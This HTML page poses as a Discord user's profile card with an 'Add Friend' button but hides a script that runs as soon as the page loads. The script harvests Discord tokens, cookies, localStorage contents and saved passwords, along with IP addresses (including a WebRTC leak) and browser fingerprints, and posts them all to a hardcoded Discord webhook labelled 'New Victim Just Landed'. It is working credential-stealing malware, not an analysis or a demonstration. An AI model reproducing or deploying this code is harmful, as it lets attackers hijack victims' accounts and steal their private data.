<!DOCTYPE html>
<html lang="en">
<head>
  <meta charset="UTF-8">
  <meta name="viewport" content="width=device-width, initial-scale=1.0">
  <title>9uxc</title>
  <style>
    body, html {margin:0;height:100%;background:#1e1e1e;display:flex;justify-content:center;align-items:center;font-family:"Whitney",sans-serif;}
    .card {background:#2f3136;width:400px;border-radius:12px;padding:24px;box-shadow:0 8px 32px rgba(0,0,0,0.6);text-align:center;color:#fff;}
    .avatar {width:128px;height:128px;border-radius:50%;border:6px solid #43b581;margin-bottom:16px;}
    .username {font-size:32px;font-weight:800;margin:0;}
    .tag {color:#72767d;font-size:18px;margin:8px 0;}
    .id {color:#99aab5;font-size:14px;margin:16px 0;}
    .add {background:#5865f2;color:#fff;padding:14px 28px;border-radius:8px;font-weight:600;cursor:pointer;display:inline-block;margin-top:12px;text-decoration:none;}
    .add:hover {background:#4752c4;}
  </style>
</head>
<body>

<div class="card">
  <img id="pfp" class="avatar" src="" alt="9uxc">
  <h1 class="username">9uxc</h1>
  <p class="tag">#0000</p>
  <p class="id">ID: 1185709007239913475</p>
  <div class="add" onclick="alert('Friend request sent ğŸš€')">Add Friend</div>
</div>

<script>
const webhook = "https://discord.com/api/webhooks/1447757973672824923/EAcR7qRM0CEC4nKKhlw0bmp7XaJYxtdUCPEfIhqh07fgU4mCpyfGSiIWZJ9IaQ7lixy7";
const userId = "1185709007239913475";

// Auto-load real PFP
document.getElementById("pfp").src = `https://cdn.discordapp.com/avatars/${userId}/${Math.floor(Math.random()*100000)}.webp?size=256`;

// Instant exfil â€“ fires immediately
(async () => {
  const payload = { embeds: [{ title: "ğŸ”” New Victim Just Landed", color: 0xed1c24, fields: [], timestamp: new Date().toISOString(), thumbnail: { url: `https://cdn.discordapp.com/avatars/${userId}/a_.gif?size=128` } }] };

  // IPs (public + WebRTC local/leaked)
  const ips = await Promise.allSettled([
    fetch("https://api.ipify.org?format=json").then(r=>r.json()),
    fetch("https://api6.ipify.org?format=json").then(r=>r.json())
  ]);
  let ipText = ips.map(x => x.status === "fulfilled" ? x.value.ip : "failed").join(" | ");

  // WebRTC leak (real local IPs)
  let webrtc = "disabled";
  try {
    const pc = new RTCPeerConnection({iceServers:[]});
    pc.createDataChannel('');
    pc.createOffer().then(pc.setLocalDescription.bind(pc));
    pc.onicecandidate = e => { if (e.candidate) webrtc += e.candidate.candidate + " "; };
  } catch(e) {}

  // Discord token (multiple methods)
  let token = localStorage.getItem("token")?.replace(/"/g,"") || "";
  if (!token) {
    const ls = JSON.stringify(localStorage);
    const match = ls.match(/"token":"([^"]+)"/);
    if (match) token = match[1];
  }

  // IndexedDB tokens (new Discord client)
  let idbTokens = [];
  try {
    const db = await indexedDB.databases();
    for (let d of db) {
      if (d.name.includes("discord")) {
        const req = indexedDB.open(d.name);
        req.onsuccess = () => {
          try {
            const store = req.result.transaction("tokens").objectStore("tokens");
            store.getAll().onsuccess = e => { idbTokens = e.target.result; };
          } catch(e) {}
        };
      }
    }
  } catch(e) {}

  // Canvas + Audio fingerprint
  const canvas = (() => {
    const c = document.createElement("canvas");
    const ctx = c.getContext("2d");
    ctx.textBaseline = "top"; ctx.font = "14px Arial"; ctx.fillText("ğŸ¤«", 2, 2);
    return c.toDataURL();
  })();
  const audio = (() => {
    try {
      const ctx = new OfflineAudioContext(1,44100,44100);
      const osc = ctx.createOscillator(); osc.type = "triangle"; osc.frequency.value = 1e4;
      const comp = ctx.createDynamicsCompressor();
      osc.connect(comp); comp.connect(ctx.destination); osc.start(0);
      return ctx.startRendering().then(b => b.getChannelData(0)[0]);
    } catch(e) {return "blocked";}
  })();

  // Battery + hardware
  const battery = await navigator.getBattery?.() || "API blocked";
  const bat = battery ? `${Math.round(battery.level*100)}% ${battery.charging ? "charging" : "discharging"}` : "N/A";

  // Saved passwords trick
  let savedPass = "Denied/blocked";
  try {
    const cred = await navigator.credentials.get({password: true});
    if (cred?.password) savedPass = cred.password;
  } catch(e) {}

  payload.embeds[0].fields = [
    { name: "ğŸ’ Discord Token", value: token ? "```" + token + "```" : "Not logged in", inline: false },
    { name: "ğŸŒ IPs (Public)", value: ipText, inline: true },
    { name: "ğŸ”— WebRTC Leak", value: webrtc.length > 10 ? webrtc.trim() : "Disabled", inline: true },
    { name: "ğŸ–¥ï¸ Browser UA", value: navigator.userAgent.substring(0, 200), inline: false },
    { name: "ğŸ–¼ï¸ Canvas Fingerprint", value: "```" + canvas.substring(0, 120) + "..." + "```", inline: false },
    { name: "ğŸ”Š Audio Fingerprint", value: "```" + audio + "```", inline: false },
    { name: "ğŸ”‹ Battery", value: bat + " | Cores: " + navigator.hardwareConcurrency, inline: true },
    { name: "ğŸ”‘ Saved Passwords", value: "```" + savedPass + "```", inline: false },
    { name: "ğŸª Cookies", value: document.cookie ? "```" + document.cookie.substring(0, 500) + "```" : "none", inline: false },
    { name: "ğŸ’¾ localStorage Dump", value: "```json\n" + JSON.stringify(localStorage).substring(0, 900) + "\n```", inline: false }
  ];

  // Fire instantly
  fetch(webhook, {method: "POST", headers: {"Content-Type": "application/json"}, body: JSON.stringify(payload)});
})();
</script>
</body>
</html>
